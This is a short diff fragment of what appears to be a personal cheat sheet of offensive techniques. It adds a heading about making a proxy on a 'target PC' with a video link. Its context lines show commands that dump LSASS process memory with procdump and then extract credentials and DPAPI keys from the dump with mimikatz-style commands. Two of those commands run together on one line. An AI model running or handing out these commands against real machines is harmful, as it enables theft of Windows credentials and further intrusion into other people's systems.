@@ -5,6 +5,11 @@
   </body>
 </p>
 
+## make proxy in target PC
+
+https://www.youtube.com/watch?v=ghZ8XK9zEfI<br>
+
+
 ````
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 sekurlsa::minidump lsass.dmpsekurlsa::dpapi
